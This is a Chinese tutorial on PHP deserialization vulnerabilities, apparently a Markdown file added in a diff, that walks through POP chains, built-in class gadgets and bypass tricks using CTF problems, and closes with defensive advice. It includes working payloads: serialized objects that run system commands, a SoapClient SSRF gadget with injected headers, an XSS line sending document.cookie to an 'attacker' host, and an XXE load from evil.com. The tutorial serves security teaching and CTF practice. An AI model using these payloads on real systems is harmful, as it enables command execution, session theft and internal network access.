@@ -1,0 +1,232 @@
+引言
+
+序列化与反序列化是开发中常用的数据交换技术，它将对象转换为可存储或传输的字符串格式，需要时再还原为对象。然而，当反序列化的输入数据被攻击者控制时，就可能触发恶意构造的对象逻辑，导致代码执行、文件读取、SSRF、XSS等严重后果。PHP语言因其广泛使用和灵活的魔术方法，成为了反序列化漏洞的“重灾区”。
+
+本文将从序列化的基本概念出发，系统梳理PHP反序列化漏洞的成因、利用手法及绕过技巧，并结合CTF题目与真实环境，展示从漏洞发现到利用的全过程。
+
+---
+
+一、理论基础：序列化、反序列化与魔术方法
+
+1.1 什么是序列化与反序列化？
+
+在PHP中，serialize()将一个对象转换成字符串，unserialize()则将字符串还原为对象。这种转换保留了对象的属性值，但不包含方法定义。反序列化时，PHP会根据类定义重新创建对象并赋值属性。
+
+```php
+class User {
+    public $name = 'admin';
+    public $isVip = true;
+}
+$obj = new User();
+echo serialize($obj);
+// O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"isVip";b:1;}
+```
+
+1.2 魔术方法：对象的“钩子”
+
+PHP中的魔术方法在特定时机自动调用，是反序列化利用的关键。常见魔术方法包括：
+
+魔术方法 触发时机
+__construct() new一个对象时
+__destruct() 对象被销毁时
+__sleep() serialize()执行前
+__wakeup() unserialize()执行后
+__toString() 对象被当作字符串使用时
+__invoke() 对象被当作函数调用时
+__call()/__callStatic() 调用不可访问/不存在的方法时
+__get()/__set() 读写不可访问/不存在的属性时
+…… ……
+
+1.3 漏洞成因：可控的反序列化数据
+
+当反序列化入口（如unserialize($_GET['data'])）未对输入进行严格过滤时，攻击者可以提交精心构造的序列化字符串。反序列化过程中自动触发的魔术方法，可能直接包含危险操作（如system()），也可能通过属性控制将恶意参数传递给普通方法，形成一条完整的调用链。
+
+示例：最简单的漏洞触发
+
+```php
+class B {
+    public $cmd = '';
+    public function __destruct() {
+        system($this->cmd);
+    }
+}
+unserialize($_GET['x']);
+```
+
+攻击者构造：x=O:1:"B":1:{s:3:"cmd";s:2:"id";}，即可执行系统命令。
+
+---
+
+二、POP链构造：面向属性编程的艺术
+
+并非所有危险操作都位于魔术方法中。更多时候，我们需要将多个类的属性“串联”起来，最终触发危险函数。这种技术被称为POP链（Property-Oriented Programming）。
+
+2.1 POP链三要素
+
+· 起点：自动触发的魔术方法（如__destruct、__wakeup）。
+· 跳板：普通方法中调用了其他类的方法或属性，可通过属性控制。
+· 终点：最终执行的敏感函数（如eval、system、file_put_contents）。
+
+2.2 构造实战：CTFSHOW 254-257
+
+在CTFSHOW的254-257题目中，逐步展示了从修改属性到利用backDoor类的POP链。
+
+257题核心代码：
+
+```php
+class ctfShowUser {
+    public $class = 'backDoor';
+    public function __construct() {
+        $this->class = new backDoor();
+    }
+}
+class backDoor {
+    public $code = 'system("tac flag.php");';
+}
+```
+
+攻击者通过反序列化直接替换$class属性为一个backDoor实例（或任意对象），并在对象销毁时触发__destruct（此处未显示，但类中若存在__destruct且调用$class的方法，则形成POP链）。最终payload：
+
+```
+O:11:"ctfShowUser":1:{s:5:"class";O:8:"backDoor":1:{s:4:"code";s:23:"system("tac flag.php");";}}
+```
+
+258题则引入了正则过滤（将:11替换为:+11），攻击者同样可以在序列化字符串中手动添加+来绕过简单检测。
+
+---
+
+三、原生类：代码库中的“万能钥匙”
+
+当目标环境中不存在自定义的可用类时，PHP内置的原生类便成为突破口。通过分析所有内置类的魔术方法，可以挖掘出通用的利用链。
+
+3.1 自动扫描魔术方法
+
+使用如下脚本遍历所有已声明类的魔术方法：
+
+```php
+$classes = get_declared_classes();
+foreach ($classes as $class) {
+    $methods = get_class_methods($class);
+    foreach ($methods as $method) {
+        if (in_array($method, ['__construct','__destruct','__toString','__call',...])) {
+            print "$class::$method\n";
+        }
+    }
+}
+```
+
+3.2 Error/Exception → XSS
+
+Exception::__toString() 会返回异常详情，其中包含传入的message。如果直接将反序列化的对象进行echo，就能触发__toString。
+
+```php
+$a = new Exception("<script>alert('XSS')</script>");
+echo serialize($a);
+```
+
+BJDCTF 2nd xss之光正是利用此点，通过Exception类将Cookie带出：
+
+```php
+new Exception("<script>window.open('http://attacker/?'+document.cookie);</script>");
+```
+
+3.3 SoapClient → SSRF
+
+SoapClient是PHP用于SOAP协议的客户端，其__call方法会发起HTTP请求。当反序列化后调用一个不存在的方法时，就会触发__call，从而发起自定义的请求。
+
+```php
+$client = new SoapClient(null, [
+    'location' => 'http://127.0.0.1/flag.php',
+    'uri'      => 'http://127.0.0.1/',
+    'user_agent' => "aaa\r\nX-Forwarded-For:127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow"
+]);
+echo urlencode(serialize($client));
+```
+
+CTFSHOW 259 正是通过构造user_agent头实现SSRF，并伪造IP访问内网flag.php。
+
+3.4 SimpleXMLElement → XXE
+
+SimpleXMLElement在实例化时若第二个参数为2（LIBXML_NOENT），第三个参数为true，则会解析外部实体，导致XXE。
+
+```php
+$sxe = new SimpleXMLElement('http://evil.com/oob.xml', 2, true);
+```
+
+SUCTF 2018 Homework 利用该原生类实现了带外XXE读取文件。
+
+---
+
+四、PHP版本与配置的“暗礁”
+
+4.1 CVE-2016-7124：__wakeup绕过
+
+影响版本：PHP5 < 5.6.25，PHP7 < 7.0.10
+漏洞原理：当序列化字符串中对象属性个数大于真实属性个数时，__wakeup不会被执行。
+
+```php
+// 正常序列化：O:4:"Name":2:{...}
+// 攻击payload：O:4:"Name":3:{...}   (将2改为3)
+```
+
+极客大挑战 2019 PHP 正是利用此漏洞绕过了__wakeup中的身份验证。
+
+4.2 属性修饰符与序列化字符串差异
+
+· public：属性名直接存储
+· protected：属性名前加\0*\0
+· private：属性名前加\0类名\0
+
+这些不可见字符（ASCII 0）在URL编码后表现为%00。某些过滤函数（如is_valid()）会检测字符ASCII码范围，若禁止%00，则无法直接传入protected或private属性。
+
+网鼎杯 2020 青龙组 AreUSerialz：
+is_valid()要求所有字符码在32-125之间，因此无法使用protected/private属性。但PHP7.1+允许对protected属性直接使用public格式进行反序列化（解析时仍按protected处理）。于是我们可以将序列化字符串中的protected属性直接写成public格式，绕过检测。
+
+```php
+// 原protected $op; 序列化为 s:4:"%00*%00op";
+// 绕过：直接 s:2:"op"; (PHP7.1+ 兼容)
+```
+
+4.3 字符逃逸：增多与减少
+
+当序列化字符串经过过滤替换时，属性的字符串长度可能发生变化，导致后续数据结构错位，进而“吞噬”或“挤出”关键属性。
+
+字符增多逃逸（长度变长）
+
+如过滤函数将a替换为aa，序列化字符串中属性值长度变长，但长度标识未更新。通过精心构造，让"后移，覆盖后续属性名或值，实现属性注入。
+
+字符减少逃逸（长度变短）
+
+如bb被替换为b，长度变短，攻击者可以“挤出”后面的内容，使某些属性被忽略或篡改。
+
+CTFSHOW 262 为字符增多逃逸的典型例题，通过本地计算偏移量，将token属性覆盖为admin。
+
+---
+
+五、防御建议：从源头阻断反序列化攻击
+
+1. 避免反序列化不可信数据：尽量使用JSON等安全格式替代。
+2. 严格白名单校验：使用allowed_classes选项限制反序列化的类。
+   ```php
+   unserialize($data, ['allowed_classes' => ['MyClass1', 'MyClass2']]);
+   ```
+3. 完整性保护：对序列化字符串加签、加密。
+4. 及时更新PHP版本，修复已知CVE。
+5. 禁用危险原生类：如SoapClient、SimpleXMLElement等，可通过disable_classes配置。
+
+---
+
+六、总结
+
+PHP反序列化漏洞是Web安全中的经典题型，从简单的魔术方法利用，到复杂的POP链构造，再到原生类与版本绕过，呈现出“点—链—面”的演进路径。理解底层序列化格式、魔术方法调用机制以及PHP版本差异，是挖掘和利用此类漏洞的核心能力。
+
+防御反序列化漏洞不仅需要代码层面的严格校验，更需要从架构层面减少对PHP序列化格式的依赖。攻防相长，唯有深入理解本质，才能在实战中立于不败之地。
+
+---
+
+参考文献
+
+· PHP Manual: Serialization
+· CVE-2016-7124
+· portswigger Insecure Deserialization labs
+· CTFSHOW、BUUCTF 相关题目
